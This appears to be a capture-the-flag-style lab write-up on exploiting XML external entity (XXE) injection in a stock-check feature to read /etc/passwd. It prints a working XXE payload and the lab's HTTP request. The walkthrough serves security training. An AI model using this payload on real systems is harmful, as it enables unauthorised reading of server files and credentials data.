## Overview :

#### Exploiting XXE to retrieve files

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

- Introduce (or edit) a **DOCTYPE element that defines an external entity** containing the path to the file.
- **Edit a data value in the XML that is returned in the application's response**, to make use of the defined external entity.

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the `/etc/passwd` file by submitting the following XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

This XXE payload defines an external entity `&xxe`; whose value is the contents of the `/etc/passwd` file and uses the entity within the productId value. This causes the application's response to include the contents of the file:

```xml
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## Solution :

Click on one of the products & click the **checkstock** feature which is vulnerable to XXE.

The browser sends the following request.


```xml
POST /product/stock HTTP/1.1
Host: 0aa400220400046b804f17dc00d300c4.web-security-academy.net

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

We can see that there is only 2 inputs that is passed via xml ie - **productID & storeID**.

First we declare a DOCTYPE with an external entity called xxe which retrieves the file _/etc/passwd_ - `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` 

We can now try to reference the entity in any of the 2 inputs to see which retreives the  /etc/passwd file & displays the content in the response.

**Payload**

Since the productID value is returned in response, we refer the entitiy in between the <productID> tags.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Thus we've solved the lab.
